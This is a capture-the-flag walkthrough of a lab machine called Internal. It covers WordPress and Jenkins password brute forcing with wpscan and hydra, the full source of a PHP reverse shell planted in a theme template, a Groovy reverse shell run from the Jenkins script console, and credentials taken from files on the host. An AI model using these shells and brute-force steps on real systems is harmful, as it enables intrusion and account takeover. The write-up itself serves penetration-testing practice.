# Internal

difficulty: Hard

---

```shell
nmap 10.201.93.226 -sC -sV
```

open ports:
80
22


```bash
feroxbuster -u http://10.201.93.226 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,403 --extract-links
```

```bash
[>-------------------] - 18s     8231/2205495 89m     found:10      errors:71     
[>-------------------] - 18s     2306/220546  125/s   http://10.201.93.226/ 
[>-------------------] - 14s     1596/220546  115/s   http://10.201.93.226/blog/ 
[>-------------------] - 11s      406/220546  38/s    http://10.201.93.226/wordpress/ 
[>-------------------] - 10s      982/220546  99/s    http://10.201.93.226/blog/wp-content/ 
[>-------------------] - 9s      1821/220546  202/s   http://10.201.93.226/blog/wp-content/themes/ 
[>-------------------] - 6s       339/220546  59/s    http://10.201.93.226/blog/wp-includes/ 
```

the /blog subdomain looks promising

the web page looks strange so we need to add internal.thm to our hosts

```bash
sudo nano /etc/hosts
```

now we can navigate to:
internal.thm/blog

It looks like this:

SS1
<img width="1908" height="925" alt="Screenshot 2025-09-08 172149" src="https://github.com/user-attachments/assets/b4adba93-3c93-48c4-9791-1f9f96c88b6b" />

If we scroll down we see a wordpress login

SS2
<img width="1915" height="938" alt="Screenshot 2025-09-08 172250" src="https://github.com/user-attachments/assets/9d05eda9-08b0-4326-9e05-55629cc1cc2a" />

we can try admin:admin credentials, and we see the username admin is valid because wordpress gives the error of the password being wrong for the username. 

SS3
<img width="332" height="328" alt="Screenshot 2025-09-08 172325" src="https://github.com/user-attachments/assets/0616ef42-ff36-41e9-a1aa-b0c504c508f2" />

So we know our username is **admin**

lets enumerate vulnerable plugins and users on the wordpress site:

```bash
wpscan --url http://10.201.93.226/blog -e vp,u   
```

SS4
<img width="1020" height="160" alt="Screenshot 2025-09-08 173300" src="https://github.com/user-attachments/assets/5481b444-62be-4bb9-8cb9-074b5078a7c2" />

we can confirm the admin username is found

```bash
wpscan --url http://10.201.93.226/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

SS5
<img width="1082" height="127" alt="Screenshot 2025-09-08 174455" src="https://github.com/user-attachments/assets/e41c3f0a-e4cf-40cb-9a4d-527f613f2a47" />

now we have the username and password:

admin:my2boys

now we have a dashboard

SS6
<img width="1900" height="883" alt="Screenshot 2025-09-08 174651" src="https://github.com/user-attachments/assets/4f9a1d73-c165-49e1-b41e-ce8336533f6b" />

We can check posts and see a private post 

SS7
<img width="1882" height="418" alt="Screenshot 2025-09-08 174737" src="https://github.com/user-attachments/assets/5f1e0180-6b7e-4abb-87c7-f5e2e0f4fc67" />

If we go to edit it to see what it contains we can see a message stating
"Don't forget to reset Will's credentials. william:arnold147"

SS8
<img width="1852" height="622" alt="Screenshot 2025-09-08 174832" src="https://github.com/user-attachments/assets/24f7e3d3-6e0d-453b-8247-5b9627992d94" />

I think this is a red herring because when we enumerated usernames for wordpress on this machine, we only know of admin, no william usernames.

From here I got stuck for a while and had to reference a writeup on this machine to figure out a direction.

We can go to appearance and the theme editor within wordpress to open a reverse shell.

SS9 
<img width="1755" height="335" alt="Screenshot 2025-09-08 175051" src="https://github.com/user-attachments/assets/35213076-198d-4623-a811-a073dccbc724" />

start a listener

```bash
nc -nvlp 53  
```

Lets go to the 404 template and edit it

SS10
<img width="1882" height="717" alt="Screenshot 2025-09-08 175219" src="https://github.com/user-attachments/assets/a763d9c7-e4aa-4e72-b81f-3adb3f4771aa" />

We will replace the 404 template with a php reverse shell code
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

Then we can just set our ip and port in the code and navigate to the 404 template to open the reverse shell.

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

Now we have a shell

```bash
ls -la
```

Again I got stuck here for a while trying to enumerate and had to reference the writeup. The writeup mentions manual enumeration is preferred for this challenge

```bash
cd /opt
ls -la
```

we see containerd (likely a docker container)
and 
wp-save.txt

```bash
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

```

Aubreanna might be a user

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

We can see aubreanna is a user here

aubreanna:bubb13guM!@#123

If we remember port 22 is open so lets try to ssh as aubreanna from our own terminal using her password

SS11
<img width="1146" height="732" alt="Screenshot 2025-09-08 180951" src="https://github.com/user-attachments/assets/bc5f943b-0431-4b59-bc84-e396d3235251" />

Now we have ssh access

```bash
aubreanna@internal:~$ id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
```

No sudo privs, just a regular user.

we can ls and retrieve the user flag from here, though.

Now we have to continue looking for the root flag

Also in the ls we can see jenkins.txt

if we cat that out we get this:

```bash
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

This seems like a docker ip

Lets see if there is a service running on 8080

```bash
netstat -ano
```

SS12
<img width="1193" height="562" alt="Screenshot 2025-09-08 181425" src="https://github.com/user-attachments/assets/b741a090-2d13-4bd4-b9c1-24701245fbcd" />

We can see there is a service running on 8080. Also note there is a service running on 3306

Lets try to ssh tunnel into this service.

we will exit out of aubreannas ssh connection then,

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@10.201.93.226
```
Then we can enter aubreannas password again

So now we're logged in again but now we have an IP address for docker0

SS13
<img width="1057" height="546" alt="Screenshot 2025-09-08 181749" src="https://github.com/user-attachments/assets/9b3a770b-fabc-452a-9332-c192fd9b01ef" />

IP address for docker0: 172.17.0.1

So now we can go to local host 127.0.0.1:8080

and we have a login page for jenkins

SS14
<img width="1852" height="913" alt="Screenshot 2025-09-08 181936" src="https://github.com/user-attachments/assets/99e0ecc9-97bc-423a-a1f8-c8f738ec84ab" />

admin:admin does not work

Lets try to brute force a password with hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password" -V
```

we get the credentials:

admin:spongebob

SS15
<img width="1317" height="690" alt="Screenshot 2025-09-08 192014" src="https://github.com/user-attachments/assets/79d19e10-d90a-40d4-bf1f-70ddfe1cf6f3" />

and we can use them to login

SS16
<img width="1892" height="792" alt="Screenshot 2025-09-08 192040" src="https://github.com/user-attachments/assets/1911aa9f-d029-416c-9901-d96e5a4b2367" />

Again I had to reference a writeup to understand the next step is to setup a reverse shell using a scripting console in the manage jenkins tab

SS17
<img width="1842" height="678" alt="Screenshot 2025-09-08 192201" src="https://github.com/user-attachments/assets/e1a6ffee-536c-44ad-ac67-3c8cefda104b" />

Let's setup another listener

```bash
nc -nvlp 6789
```

Lets grab a groovy reverse shell:

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

and we change the string cmd to:

```bash
String cmd="/bin/sh";
```

SS18
<img width="1335" height="536" alt="Screenshot 2025-09-08 192608" src="https://github.com/user-attachments/assets/5e46a64a-79b2-4986-ae88-ff0c6d82fa69" />

We can use id and see we are jenkins

```bash
ls -la
```

root directory

```bash
cd opt
```

we see a note.txt we can cat it out and we get:

Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

now we can use this to ssh into root

SS19
<img width="1177" height="705" alt="Screenshot 2025-09-08 193145" src="https://github.com/user-attachments/assets/d95ae176-0152-443b-9cb9-2f82bf9c3c34" />

we can ls -la and find the root.txt

